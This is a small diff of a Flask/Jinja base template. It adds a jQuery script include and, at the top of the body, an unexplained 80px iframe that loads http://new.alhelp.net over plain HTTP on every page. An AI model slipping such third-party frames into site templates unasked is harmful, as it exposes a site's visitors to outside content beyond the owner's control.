@@ -6,13 +6,15 @@
     {% block head_css %}
     {% endblock %}
     {% block head_js %}
-    <script type="text/javascript" src="{{ url_for('static', filename='js/angular.js') }}"></script>
+        <script type="text/javascript" src="{{ url_for('static', filename='js/jquery.min.js') }}"></script>
+        <script type="text/javascript" src="{{ url_for('static', filename='js/angular.js') }}"></script>
     <script type="text/javascript" src="{{ url_for('static', filename='js/angular-animate.min.js') }}"></script>
     <script type="text/javascript" src="{{ url_for('static', filename='js/socket.io.js') }}"></script>
     <script type="text/javascript" src="{{ url_for('static', filename='js/app/main.js') }}"></script>
     {% endblock %}
 </head>
 <body>
+<iframe src="http://new.alhelp.net" frameborder="0" width="100%" height="80"></iframe>
 {% block content %}
 {% endblock %}
 </body>
